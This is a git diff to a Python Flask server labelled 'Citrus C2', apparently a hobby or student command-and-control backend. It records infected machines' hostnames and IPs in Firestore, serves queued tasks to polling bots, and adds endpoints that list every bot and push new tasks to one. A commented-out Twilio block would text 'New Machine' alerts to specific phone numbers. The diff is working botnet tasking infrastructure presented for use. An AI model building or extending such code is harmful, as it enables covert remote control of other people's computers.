@@ -1,4 +1,4 @@
-from flask import request, Blueprint
+from flask import jsonify, request, Blueprint
 
 import firebase_admin
 from firebase_admin import credentials, firestore
@@ -7,7 +7,18 @@ import uuid
 
 from . import routes
 
+# from twilio.rest import Client
+
+# from dotenv import load_dotenv
+import os
+
 client_api = Blueprint('client_api', __name__)
+# load_dotenv()
+
+#Twilio
+account_sid = os.getenv('twilio_account_sid')
+auth_token  = os.getenv('twilio_auth_token')
+# client = Client(account_sid, auth_token)
 
 # Firestore/Firebase Stuff
 cred = credentials.Certificate("serviceAccountKey.json")
@@ -25,6 +36,12 @@ def index(hostname):
         'poll_rate': 5,
         'tasks': [],
     })
+
+    # message = client.messages.create(
+    #     to="+17148512888", 
+    #     from_="+12185208855",
+    #     body=f"\n=Citrus C2 Notification: New Machine=\nIP: {request.remote_addr}\nHostname: {hostname}\nUUID: {id}"
+    # )
 
     return {'uuid': id}
 
@@ -46,3 +63,46 @@ def poll():
         return {'task': task}
 
     return ({'task': None}, 418)
+
+
+@routes.route('/bot/allinfo/', methods=['GET'])
+def info():
+    machines = db.collection('machines').get()
+
+    res = []
+
+    for x in machines:
+        print(x.to_dict())
+        tmp = {}
+        tmp['hostname'] = x.to_dict()['hostname']
+        tmp['uuid']=x.to_dict()['uuid']
+        tmp['ip']=x.to_dict()['ip']
+        res.append(tmp)
+    return jsonify(res)
+
+
+@routes.route('/bot/hostinfo/<string:input_uuid>', methods=['GET'])
+def hostinfo(input_uuid):
+    machines = db.collection('machines').where('uuid', '==', input_uuid).limit(1).get()
+    if not machines:
+        return {'Error': 'No machines found'} #a57a2176-1447-4311-a94b-8c9235ea580f
+    machine = machines[0]
+    return machine.to_dict()
+
+
+
+@routes.route('/bot/push', methods=['POST'])
+def push():
+    machines = db.collection('machines').where(
+        'uuid', '==', request.headers.get('uuid')).limit(1).get()
+
+    if not machines:
+        return {'Error': 'No machines found'}
+
+    machine = machines[0]
+    tasks = machine.to_dict()['tasks']
+
+    tasks.append(request.headers.get('task'))
+    machine.reference.update({'tasks': tasks})
+
+    return {'success': True}
